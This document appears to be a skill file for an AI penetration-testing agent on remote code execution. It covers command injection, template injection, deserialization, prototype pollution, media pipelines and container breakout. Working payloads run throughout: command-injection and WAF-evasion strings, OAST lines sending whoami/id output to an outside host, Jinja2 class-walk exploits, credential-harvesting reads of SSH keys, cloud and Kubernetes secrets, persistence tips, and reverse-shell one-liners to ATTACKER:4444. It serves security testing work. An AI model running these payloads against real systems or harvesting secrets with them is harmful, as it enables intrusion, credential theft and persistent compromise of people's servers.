---
name: rce
description: RCE testing covering command injection, deserialization, template injection, and code evaluation
---

# RCE

Remote code execution leads to full server control when input reaches code execution primitives: OS command wrappers, dynamic evaluators, template engines, deserializers, media pipelines, and build/runtime tooling. Focus on quiet, portable oracles and chain to stable shells only when needed.

## Attack Surface

**Command Execution**
- OS command execution via wrappers (shells, system utilities, CLIs)

**Dynamic Evaluation**
- Template engines, expression languages, eval/vm

**Deserialization**
- Insecure deserialization and gadget chains across languages

**Media Pipelines**
- ImageMagick, Ghostscript, ExifTool, LaTeX, ffmpeg

**SSRF Chains**
- Internal services exposing execution primitives (FastCGI, Redis)

**Container Escalation**
- App RCE to node/cluster compromise via Docker/Kubernetes

## Detection Channels

### Time-Based

**Unix**
- `;sleep 1`, `` `sleep 1` ``, `|| sleep 1`
- Gate delays with short subcommands to reduce noise

**Windows**
- CMD: `& timeout /t 2 &`, `ping -n 2 127.0.0.1`
- PowerShell: `Start-Sleep -s 2`

### OAST

Use `interactsh-client -v` in the sandbox to mint a unique callback
domain (`*.oast.fun`); substitute it for `attacker.tld` below. Each
invocation prints inbound DNS/HTTP hits to stdout in real time.

**DNS**
```bash
nslookup $(whoami).xyz.oast.fun
```

**HTTP**
```bash
curl https://xyz.oast.fun/$(hostname)
```

### Output-Based

**Direct**
```bash
;id;uname -a;whoami
```

**Encoded**
```bash
;(id;hostname)|base64
```

### Confirmation-Primitive Ladder

Not every callback signal proves execution. Deserialization payloads like URLDNS (above) hit a DNS resolver without executing code; some SSRF chains reach an HTTP callback via a URL fetch, not an exec; a time delay may reflect a WAF's own artificial-delay behavior. The ladder — order signals by *what they prove*, not by *what they look like* — and pick the lowest rung that fits the sink so a false positive does not survive:

- **Level 0 — DNS callback.** A DNS hit on `$(whoami).xyz.oast.fun` from a *string* sink (`sh -c` context) proves command substitution ran to compute the label. A DNS hit from a deserialization payload (URLDNS-shape) proves *only* that the deserializer resolved a URL, not that arbitrary code ran. Distinguish by payload class — a chain-of-classes payload that only reaches `URL.hashCode` is Level 0 detection, nothing more.
- **Level 1 — HTTP callback.** An HTTP hit from `curl https://xyz.oast.fun/$(hostname)` proves both command substitution ran (`$(hostname)` computed) *and* the target has HTTP egress. Distinguishes from a raw DNS-only chain, but still fires from an SSRF sink that fetches URLs — separate the "target requested my URL" case from the "target ran my command that requested my URL" case.
- **Level 2 — OOB file drop.** A command writes an attacker-supplied string to a location the attacker can read back — `curl -X POST xyz.oast.fun/x -d "$(id)"`, or `wget https://xyz.oast.fun/x?$(id | jq -sRr @uri)`. The callback body carries the exec output, so a reflected string with the target's actual `id` output proves exec ran *and* gives the primitive channel.
- **Level 3 — In-band file drop.** The command writes to a serveable path on the target (`/var/www/html/x`, `/tmp/x`) and the attacker re-requests it. The re-request response carries the exec output — no OAST needed, so this works when egress is blocked. Requires write to a location the app serves.
- **Level 4 — Time delay.** `; sleep 5` (or the Windows/PowerShell equivalents) plus a wall-clock measurement. Proves exec ran but not what ran; noisy against WAFs that hold or coalesce requests. Use only when Level 0–3 signals are unavailable.
- **Level 5 — In-band exec-reflected output.** The response to the injection carries the command output directly — `; id` yields `uid=...` in the HTTP body. Proves exec ran AND channels the output back, so no separate exfil is needed. The strongest rung, but requires the sink to reflect and the WAF not to strip.

The false-positive-discipline consequence: for deserialization findings, a `URLDNS`/DNS hit is Level 0 detection — do not report it as RCE without escalating to Level 2 or above with a distinct payload. For SSRF chains that reach an HTTP callback, the finding is SSRF until a command payload distinct from URL fetching produces a Level 2+ signal. Load `rce_advanced_deep` for the ladder applied to blind deserialization and second-order sinks.

## Key Vulnerabilities

### Command Injection

**Delimiters and Operators**
- Unix: `; | || & && `cmd` $(cmd) $() ${IFS}` newline/tab
- Windows: `& | || ^`

**Argument Injection**

An attacker-controlled string reaching an argv position that a downstream binary interprets as an *option* — where that option itself calls a shell or reads a file — is the class the array-form boundary leaves open. The primitive is not "chain a second command" (the array form still blocks that); it is "reach a documented sub-sink the tool itself hosts." Two anchors from the 2025–2026 frontier:

- **CVE-2025-21613** (go-git < 5.13.0, CVSS 9.8, CWE-88): a controllable clone URL reaches `git-upload-pack` argv. The `file://` transport is the *only* go-git transport that shells out to a git binary (`plumbing/transport/file/client.go` invokes `execabs.Command` on `git-upload-pack`/`git-receive-pack`); other transports (HTTP, SSH-native) do not, so this bug scopes strictly to `file://`. Primitive: attacker URL → arbitrary git-upload-pack flags → RCE when a flag reaches a shell sub-sink. The successor **CVE-2026-45570** (go-git < 5.19.1, CVSS 9.6) closes the same class in the SSH transport — a sibling seam the file://-transport fix did not cover.
- **CVE-2026-52806** (Gogs < 0.14.3, CVSS 9.9): an unprotected branch name reaches `git rebase --quiet <base> <head>` at `internal/database/pull.go:282`. A branch of the form `--exec=<cmd>` is interpreted as git's `--exec` flag, and `git rebase --exec` is *documented* to invoke its argument via `sh -c` after every replayed commit — the promotion is direct, not option-confusion. Published PoC uses `${IFS}` to work around the space-in-branch-name limitation.

The class fingerprint: any tool whose flag list includes an option that runs a subprocess (`git --exec`, `curl --config` for a file with directives, `ssh -o ProxyCommand=`, `rsync -e`, `tar --use-compress-program=`, `ffmpeg` protocol/concat with a lax `protocol_whitelist`, ImageMagick delegates), reached via an argv position the attacker controls. Fixing the specific flag does not close the class — the next flag with the same shape is available. Encoding/breakout mechanics (quote alternation, `$PATH`/`${HOME}` expansion, `%TEMP%`/`!VAR!` on Windows, PowerShell `$(...)`) are options for reaching non-shell positional sinks. Load `argument_injection` for the general option-smuggling and end-of-options-delimiter methodology, `rce_advanced_deep` for the per-tool sub-sink matrix.

**Path and Builtin Confusion**
- Force absolute paths (`/usr/bin/id`) vs relying on PATH
- Use builtins or alternative tools (`printf`, `getent`) when `id` is filtered
- Use `sh -c` or `cmd /c` wrappers to reach the shell

**Evasion**
- Whitespace/IFS: `${IFS}`, `$'\t'`, `<`
- Token splitting: `w'h'o'a'm'i`, `w"h"o"a"m"i`
- Variable building: `a=i;b=d; $a$b`
- Base64 stagers: `echo payload | base64 -d | sh`
- PowerShell: `IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(...)))`

**Cross-language exec-sink table.** Whether a shell metacharacter (`;`, `|`,
`$()`) in a controlled argument runs a second command depends entirely on
whether the call goes through a **shell**. Measured (Node 24, Python 3.14, PHP
8.4, Go 1.26, Ruby 3.3) — inject `SAFE; id` and check for `uid=` in the output:

| Runtime | Shell form → **command chaining works** | Array/exec-file form → arg passed **literally** (no chaining) |
|---|---|---|
| Node | `exec(str)`, `execSync(str)`, `spawn(cmd,{shell:true})` | `execFile("bin",[arg])`, `spawn("bin",[arg])` |
| Python | `subprocess.run(str, shell=True)`, `os.system` | `subprocess.run(["bin",arg])`, `Popen([...])` |
| PHP | `system`/`exec`/`shell_exec`/`passthru`/backticks (string) | `escapeshellarg($arg)` around the value |
| Go | `exec.Command("sh","-c", str)` | `exec.Command("bin", arg)` |
| Ruby | `` `#{x}` ``, `system(str)`, `%x{}` | `system("bin", arg)`, `IO.popen(["bin",arg])` |

The rule: **the array/exec-file form is safe from command *chaining*** — the
`;` is an inert character inside one argv element (measured `literal arg (safe)`
for every language above). So when you see a shell string sink, inject
operators; when you see the array form, chaining is dead — but the argument is
still attacker-controlled, so pivot to **option/operand injection** (a leading
`-`/`--flag`, a response/config file, a subcommand). Load `argument_injection`
for that residual, which is exactly the boundary the array form leaves open.

**Windows CreateProcess / cmd.exe parser-differential — the exception to "array-form is safe from chaining."** When the *resolved target* of an array-form spawn is a `.bat` or `.cmd` file, Win32 `CreateProcess` implicitly launches `cmd.exe` as the interpreter and reconstructs the command line, re-parsing it under cmd's rules (`& | ^` and quoting differ from the C-runtime argv rules the calling runtime already applied). The array boundary is broken by the OS layer, not the runtime — this is the **BatBadBut** class. Two verifiable Node.js anchors and one multi-vendor coordinated disclosure cluster:

- **CVE-2024-27980** (Node.js, HIGH 8.1): `child_process.spawn`/`spawnSync` with `shell:false`, target `.bat`/`.cmd`, injected `& id` in an argv element executes. Fixed 18.20.2 / 20.12.2 / 21.7.3.
- **CVE-2024-36138** (Node.js, HIGH 8.1): "Bypass incomplete fix of CVE-2024-27980" — the `-27980` fix missed batch-file variants with mixed case and other extension shapes. Fixed 18.20.4 / 20.15.1 / 22.4.1. The successor is the durability signal: the class is a stratum, not one CVE.
- The April 2024 coordinated disclosure cluster expressed the same OS-layer differential across runtimes — **CVE-2024-24576** (Rust std < 1.77.2, CVSS 10.0), **CVE-2024-1874** (PHP `proc_open` array-syntax escaping, fixed 8.1.28 / 8.2.18 / 8.3.5), **CVE-2024-22423** (yt-dlp `--exec` with `%q`, fixed 2024.04.09), **CVE-2024-3566** (multi-vendor CreateProcess, CVSS 9.8, Haskell `process` < 1.6.19.0 and Node.js Windows).

Cross-runtime remediation stratified at disclosure: Node / Rust / PHP / Haskell shipped patches; Go, Python, Ruby, Erlang shipped documentation-only updates; Java was labelled *won't fix*. A call from Java `Runtime.exec` array form to a `.bat` target on Windows in 2026 is structurally vulnerable, and the mitigation is cmd.exe-specific escaping at the caller, not a stdlib fix. Load `rce_advanced_deep` for the full cross-runtime remediation table and the reusable class fingerprint.

### Template Injection

A `{{7*7}}` → `49` *evaluation* (not literal reflection) is server-side code execution — the template engine is a code-eval sink whose input surface a developer often mistakes for user data rather than program text. Load `ssti` for the engine probe catalog and per-engine gadget chains (Jinja/Twig/Freemarker/Velocity/Thymeleaf/ERB/EJS/Nunjucks). Here: the transition to exec, and the sandboxed-vs-unsandboxed engine differential that decides whether the class is available at all.

**The class-walk chain.** The canonical Python/Jinja2 transition traverses the object graph reachable from any template-visible object (`self`, a passed variable, `lipsum`, `cycler`) to reach `os.popen` — arbitrary Python execution in the rendering process:
```
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ self.__init__.__globals__.__builtins__['__import__']('os').popen('id').read() }}
```
The confirmation signal is in-band echo of the command output — no OAST needed when the template result reflects to the response.

**The sandboxed-vs-unsandboxed differential.** Jinja2 ships two environments: `jinja2.Environment` (default, no sandbox) and `jinja2.sandbox.SandboxedEnvironment` (blocks `__`-prefixed attribute access via `is_safe_attribute`). Applications rendering user-controlled template text through the default `Environment` — including `Template(content).render()` — expose the class-walk chain immediately. Two 2026 CVEs make the class concrete:

- **CVE-2026-27961** (Agenta ≤ 0.86.7, CVSS 8.8, fixed 0.86.8): renders through unsandboxed `Template(content).render()` at `sdk/agenta/sdk/workflows/handlers.py:283` when `template_format=jinja2`. Advisory publishes `{{ lipsum.__globals__['os'].popen('id').read() }}` as attack vector.
- **CVE-2026-31864** (JumpServer ≤ 3.10.21 / ≤ 4.10.15, CVSS 6.8): `Environment()` in `apps/common/utils/yml.py::yaml_load_with_i18n()` renders a user-uploaded manifest.yml. Advisory publishes the `self.__init__.__globals__.__builtins__` chain.

The differential is a grep — `SandboxedEnvironment` vs `Environment` on the render path. Miss the sandbox marker or miss the class-walk-attribute filter and the finding is available.

**JavaScript template layers escape via `constructor.constructor` → `Function()`.** ECMA-262 `Function(str)` compiles its argument as code; any expression language handing out a property-access primitive over user objects walks `x.constructor.constructor(...)` to `Function` and evaluates an arbitrary string. **CVE-2024-55652** (pwndoc, fixed 1.0.0): a custom `select` filter fetched arbitrary `attr` properties without prototype-chain restriction; the published PoC reaches `Function` and then `process.binding('spawn_sync').spawn({file:'/bin/sh', args:['sh','-c','id'], ...}).output.toString()`. **CVE-2026-23830** (SandboxJS) confirms the primitive is still exploited where property access is unrestricted.

Empirical baseline: TEFuzz (USENIX Security 2023, Zhao/Zhang/Yang, Fudan) discovered 135 previously-unknown template-escape bugs across 7 PHP template engines and auto-synthesized working RCE exploits for 55 of them. Assume any sandboxed template engine is escapable in practice until proven otherwise; the sandbox is a mitigation, not a boundary. Load `ssti` for the per-engine probe/gadget catalog and `rce_novel_deep` for the class-walk / constructor-chain frontier.

### Deserialization and Expression Languages

Load `insecure_deserialization` for the full gadget-chain catalog — Java native / Jackson / Fastjson autotype, .NET `BinaryFormatter` / ViewState, PHP `unserialize` / Phar, Python pickle / PyYAML, Ruby Marshal, and the ysoserial / phpggc / ysoserial.net tooling. It is the canonical owner. Here: the false-positive discipline that decides whether a deserialization signal proves exec, and the supply-chain reframing that decides whether the class is exploitable at all on a given target.

**URLDNS is detection-only, not execution.** The ysoserial `URLDNS` gadget deserializes a `HashMap` whose `readObject` computes `HashMap.hash` for a `URL` key; `URL.hashCode` resolves the URL's hostname via DNS. It reaches the DNS resolver *and no other sink*. A Collaborator DNS hit on a `URLDNS` payload proves that **untrusted deserialization occurred** — not that arbitrary code executed. Every other ysoserial gadget requires classpath conditions (specific library on the CLASSPATH, an unsafe deserialization sink in the application); URLDNS requires only the JVM's built-in `HashMap`+`URL`. Treat URLDNS as the confirmation-ladder Level 0 primitive — a class-of-sink probe, not an exec proof.

**Gadget-chain reachability is a supply-chain property that fluctuates over a dependency's history.** Class serializability is not a static attribute — small, transitive changes to a dependency's history can create the class-graph conditions for a new chain. The Sleeping Giants study (Kreyssig/Houy/Riom/Bartel, ACM CCS 2025) applied three modification patterns (Transitive Serializability, Final Properties, Interface Method Reachability) to 533 Maven dependencies and produced new detections in 26.08% of them; manual verification confirmed dormant chains in 53 dependencies, with 49.06% of true positives requiring only one pattern. Consequence for the assessor: "the app doesn't call the gadget class" is not a mitigation — chain construction is constrained only by **what classes are on the classpath**, including transitively-included libraries the application never invokes. The majority pattern in publicly-known chains is runtime polymorphism at the deserializer's trampoline (`Object.hashCode()`, `Runnable.run()`) — 22 of 34 ysoserial payloads rely on trampoline gadgets per Sleeping Giants (ICSE'25 count). JEP 290 `ObjectInputFilter` and JPMS module boundaries are mitigations that operate *on top of* the classpath-composition constraint, not refutations of it. Load `rce_advanced_deep` for the confirmation-primitive ladder in depth, `rce_novel_deep` for the current supply-chain reframing frontier.

Expression languages (OGNL, SpEL, MVEL, JSP EL) reach `Runtime`/`ProcessBuilder` the same way — SpEL/Thymeleaf specifically is covered in `ssti`; Struts-style OGNL and standalone EL injection are code-eval sinks that land at the same execution boundary. JNDI/LDAP lookups (Log4Shell-style) reach code execution through a *different* input path than deserialization — see the JNDI-pivot discussion in `insecure_deserialization`.

### Prototype Pollution to Exec

Node.js prototype pollution reaches command execution through gadgets in the standard library that read attacker-writable properties from `Object.prototype` before dispatching to a shell, a module loader, or the V8 debugger. This is *not* the CSP-tier bypass class; it is a first-class RCE primitive when the target ever pollutes and then spawns anything downstream.

**Universal `child_process` gadget.** Silent Spring (Shcherbakov/Balliu/Staicu, USENIX Security 2023) shows that every `child_process` command API (`spawn`, `spawnSync`, `exec`, `execSync`, `execFileSync`, `fork`) reads from a polluted `Object.prototype.shell` and `Object.prototype.env` when the call site does not pass an explicit `options` argument. The gadget landing the exec primitive on any subsequent spawn:
```
Object.prototype.shell = 'node';
Object.prototype.env = {};
Object.prototype.env.NODE_OPTIONS = '--inspect-brk=0.0.0.0:1337';
// any child_process spawn after this launches Node with V8 inspector open → attach → arbitrary JS
```
Primitive: attacker-reachable Node inspector on any subsequent Node subprocess spawn. Confirmation signal: `curl http://target:1337/json/version` returns a `webSocketDebuggerUrl` — attach with `chrome://inspect` or a client and pin arbitrary JS. Corollary: any Node app vulnerable to prototype pollution that shells out post-pollution is vulnerable to RCE. The mitigation is the call site — `spawn(cmd, args, { shell: false, env: process.env })` immunizes even with a polluted prototype.

**`require()` and `import()` gadgets — in-process, no child_process.** GHunter (Cornelissen/Shcherbakov/Balliu, USENIX Security 2024) systematizes the runtime gadget surface: 56 universal PP gadgets in Node.js v21.0.0, 67 in Deno v1.37.2. Three concrete `require`/`import` gadgets:

- **`require()` gadget A** — polluting `Object.prototype.main` makes `require()` of a package whose `package.json` lacks a `main` field fall through to the polluted value and load the attacker-chosen file.
- **`require()` gadget B** — **CVE-2023-31414** (CVSS 9.1, exploited end-to-end in Kibana 8.7.0, patched Node.js v18.19.0): when `readPackage()` misses `package.json` it returns `false`; `(false)?.main` traverses `Object.prototype` because `Boolean` inherits from `Object.prototype`, so a polluted `main` reaches `tryPackage()` and is loaded and evaluated.
- **`import()` gadget** — pollute `Object.prototype.source` with attacker-supplied JavaScript, then invoke `import()` on any `.mjs` file; the polluted `source` value is evaluated as module code.

Primitive: in-process arbitrary JavaScript in the Node.js runtime. Confirmation signal: the attacker code runs inside the Node process — a side-effect (file drop), a callback, or in-band stdout serves as proof. Load `prototype_pollution` for the source-of-pollution methodology (Lodash-family merge sinks, unmerged `Object.assign` on user JSON, query-string parsers) and `rce_novel_deep` for the GHunter per-impact table and the Deno-specific gadget set.

### Media and Document Pipelines

These out-of-process converters are first-class RCE sinks whether reached by
upload or by any input that feeds them. For the version-pinned CVEs
(ImageTragick CVE-2016-3714, Ghostscript `%pipe%` CVE-2023-36664 / `-dSAFER`
CVE-2018-16509) and the upload-delivery angle, load `insecure_file_uploads`.

**ImageMagick/GraphicsMagick**
- policy.xml may limit delegates; still test legacy vectors
```
push graphic-context
fill 'url(https://x.tld/a"|id>/tmp/o")'
pop graphic-context
```

**Ghostscript**
- PostScript in PDFs/PS: `%pipe%id` file operators

**ExifTool**
- Crafted metadata invoking external tools or library bugs

**LaTeX**
- `\write18`/`--shell-escape`, `\input` piping; pandoc filters

**ffmpeg**
- concat/protocol tricks mediated by compile-time flags

### SSRF to RCE

**FastCGI**
- `gopher://` to php-fpm (build FPM records to invoke system/exec)

**Redis**
- `gopher://` write cron/authorized_keys or webroot
- Module load when allowed

**Admin Interfaces**
- Jenkins script console, Spark UI, Jupyter kernels reachable internally

### Container and Kubernetes

The RCE-in-container → node/host RCE transition is a separate escalation surface — `cloud/kubernetes.md` owns the full K8s escape catalog (privileged pod escape, hostPath, daemonset persistence, kubelet 10250/10255 primitives, node lateral movement). Here: the two 2024 runtime-layer classes that promote the transition, and the enumeration order.

**Docker enumeration**
- From app RCE, inspect `/.dockerenv`, `/proc/1/cgroup`
- Enumerate mounts and capabilities: `capsh --print`
- Abuses: mounted `docker.sock` (writable = host takeover), hostPath mounts, privileged containers
- Write to `/proc/sys/kernel/core_pattern` or mount host with `--privileged`

**Kubernetes enumeration**
- Steal service-account token from `/var/run/secrets/kubernetes.io/serviceaccount/token`
- Query API for pods/secrets, enumerate RBAC
- Talk to kubelet on 10250/10255, exec into pods
- Escalate via privileged pods, hostPath mounts, or daemonsets

**runc "Leaky Vessels" — the 2024 runtime-layer container-to-host breakout.** **CVE-2024-21626** (runc < 1.1.12, HIGH 8.6): runc leaks host-side directory file descriptors into `runc init`. If the container's OCI `process.cwd` (set by the Dockerfile `WORKDIR` directive) points at `/proc/self/fd/<n>`, runc `chdir()`s into that path *before* closing the leaked fds and *without* verifying the final working directory is inside the container mount namespace — the container's pid 1 has a working directory in the host mount namespace. Primitive: container-to-host breakout with (i) read on sensitive host files, (ii) arbitrary-file-write on the host filesystem. Two delivery vectors: (a) the victim builds or runs a malicious image whose Dockerfile carries the crafted `WORKDIR /proc/self/fd/<n>`, (b) the attacker already inside a running container invokes `runc exec` with the malicious path. Confirmation signal: from inside the container, resolving `cwd` or accessing `../` from cwd reads/writes host-namespace paths. Patched in runc 1.1.12. Load `rce_novel_deep` for the full delivery mechanics and the BuildKit surface adjacent to this class.

## Bypass Techniques

**Encoding Differentials**
- URL encoding, Unicode normalization, comment insertion, mixed case
- Request smuggling to reach alternate parsers

**Binary Alternatives**
- Absolute paths and alternate binaries (busybox, sh, env)
- Windows variations (PowerShell vs CMD)
- Constrained language bypasses

## Post-Exploitation

**Reconnaissance and Secret Harvesting** (do this first — the finding's real
impact is what the shell reveals). Order of operations: environment, then config,
then credential files, then container/cloud context. Harvest before you escalate.

Environment variables are the highest-yield first read — build-time `--build-arg`
secrets, `.env` files loaded into the process, and orchestrator-injected values
(Compose, Kubernetes ConfigMaps/Secrets) all land here. PID 1's environment is the
most reliable in a container because it survives child-process spawning:
```bash
env; printenv
cat /proc/1/environ    | tr '\0' '\n'
cat /proc/self/environ | tr '\0' '\n'
```
If these show `UPPERCASE_NAME=...` values (DB URLs, API keys, cloud creds), that is
the credential store — extract every one before doing anything else.

Application config, per framework:
- Python: `os.environ`, Flask `app.config.items()`, Django `django.conf.settings`
- Node.js: `process.env`, the loaded `config` module
- PHP: `$_ENV`, `$_SERVER`, `phpinfo()` if you can reach/write a page
- Ruby: `ENV.to_h`, Rails `Rails.application.credentials`

Credential files — targeted reads beat recursive search:
```bash
cat .env .env.local ~/.aws/credentials ~/.netrc ~/.docker/config.json 2>/dev/null
cat ~/.ssh/id_rsa ~/.ssh/authorized_keys 2>/dev/null
cat ~/.kube/config /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
```

Container context:
```bash
test -f /.dockerenv && echo "[in container]"
cat /proc/1/cgroup                        # runtime + often the container ID
mount | grep -Ei 'docker|overlay'
ls -l /var/run/docker.sock 2>/dev/null    # writable docker.sock = host takeover
```

Cloud metadata: RCE makes the target your pivot into the cloud metadata service —
run the same probes from inside the process. Load `ssrf` for the per-provider
endpoint catalog (`169.254.169.254` / IMDSv2 / GCP / Azure); this is the natural
next step from RCE, not a separate vulnerability class.

Database recon when a connection string is reachable (from the env/config above) —
enumerate for seeded secrets rather than dumping everything:
```bash
sqlite3 <file> .dump                        # SQLite
mysql   ... -e 'SHOW TABLES'                 # MySQL/MariaDB
psql    ... -c '\dt'                         # Postgres
```
Look for tables named `users`, `secrets`, `tokens`, `admin_*`, `licenses` — the
value of interest is often a single seeded row.

Filesystem grep — last resort, slow and noisy; prefer env/config reads first:
```bash
grep -rIn -E '<pattern>' /app /srv /var/www /home /root /opt 2>/dev/null
```

Skip immediately: recursive `find /`, kernel-module inspection, and unfocused
`ps` trawling — they burn turns for little on a web assessment.

**Privilege Escalation**
- `sudo -l`; SUID binaries; capabilities (`getcap -r / 2>/dev/null`)

**Persistence**
- cron/systemd/user services; web shell behind auth
- Plugin hooks; supply chain in CI/CD

**Lateral Movement**
- SSH keys, cloud metadata credentials, internal service tokens

**Shell Stabilization** (only when an interactive shell is actually needed —
prefer OAST + selective reads first). Upgrade a dumb shell to a PTY:
```bash
# on target, whichever interpreter exists:
python3 -c 'import pty;pty.spawn("/bin/bash")'   # or: script -qc /bin/bash /dev/null
# background with Ctrl-Z, then on the attacker's listener:
stty raw -echo; fg
# back on target: export TERM=xterm; stty rows 50 cols 200
```
`socat` gives a full PTY in one step:
`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:4444`.

**Reverse-shell one-liners** (one-shot, not persistence):
```bash
bash -i >& /dev/tcp/ATTACKER/4444 0>&1               # bash /dev/tcp
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER 4444 >/tmp/f   # no-bash fallback
python3 -c 'import socket,pty,os;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
```

## Testing Methodology

1. **Identify sinks** - Command wrappers, template rendering, deserialization, file converters, report generators, plugin hooks
2. **Establish oracle** - Timing, DNS/HTTP callbacks, or deterministic output diffs (length/ETag)
3. **Confirm context** - User, working directory, PATH, shell, SELinux/AppArmor, containerization
4. **Map boundaries** - Read/write locations, outbound egress
5. **Progress to control** - File write, scheduled execution, service restart hooks

## Validation

1. Provide a minimal, reliable oracle (DNS/HTTP/timing) proving code execution
2. Show command context (uid, gid, cwd, env) and controlled output
3. Demonstrate persistence or file write under application constraints
4. If containerized, prove boundary crossing attempts (host files, kube APIs) and whether they succeed
5. Keep PoCs minimal and reproducible across runs and transports

## False Positives

- Only crashes or timeouts without controlled behavior
- Filtered execution of a limited command subset with no attacker-controlled args
- Sandboxed interpreters executing in a restricted VM with no IO or process spawn
- Simulated outputs not derived from executed commands

## Impact

- Remote system control under application user; potential privilege escalation to root
- Data theft, encryption/signing key compromise, supply-chain insertion, lateral movement
- Cluster compromise when combined with container/Kubernetes misconfigurations

## Pro Tips

1. Prefer OAST oracles; avoid long sleeps—short gated delays reduce noise
2. When command injection is weak, pivot to file write or deserialization/SSTI paths
3. Treat converters/renderers as first-class sinks; many run out-of-process with powerful delegates
4. For Java/.NET, enumerate classpaths/assemblies and known gadgets; verify with out-of-band payloads
5. Confirm environment: PATH, shell, umask, SELinux/AppArmor, container caps
6. Keep payloads portable (POSIX/BusyBox/PowerShell) and minimize dependencies
7. Document the smallest exploit chain that proves durable impact; avoid unnecessary shell drops

## Tooling

- Reverse-shell listener: `ncat -lvnp 4444` (in the sandbox; `ncat` is the
  netcat variant that ships in the image). Pair with a one-shot shell
  payload only when OAST + selective reads are insufficient — never
  drop a persistent shell when a single targeted command will prove it.

## Summary

RCE is a property of the execution boundary. Find the sink, establish a quiet oracle, and escalate to durable control only as far as necessary. Validate across transports and environments; defenses often differ per code path.
